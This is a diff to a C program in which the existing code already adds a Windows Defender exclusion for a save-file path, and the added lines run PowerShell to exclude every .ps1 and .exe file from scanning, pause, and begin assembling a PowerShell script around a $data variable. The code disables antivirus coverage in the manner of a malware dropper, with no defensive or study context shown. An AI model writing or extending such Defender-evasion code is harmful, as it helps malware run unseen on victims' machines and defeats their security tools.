@@ -99,6 +99,16 @@ int main() {
     char command[1024];
     snprintf(command, sizeof(command), "powershell.exe -Command \"Add-MpPreference -ExclusionPath '%s'\"", saveFilePath);
     system(command);
+    
+    char command11[1024];
+    snprintf(command11, sizeof(command11), "powershell.exe -Command \"Add-MpPreference -ExclusionExtension '.ps1'\"");
+    system(command11);
+
+    char command12[1024];
+    snprintf(command12, sizeof(command12), "powershell.exe -Command \"Add-MpPreference -ExclusionExtension '.exe'\"");
+    system(command12);
+
+    Sleep(4000);
 
     sprintf(formattedString, 
             "$data = \"%s\"\n"
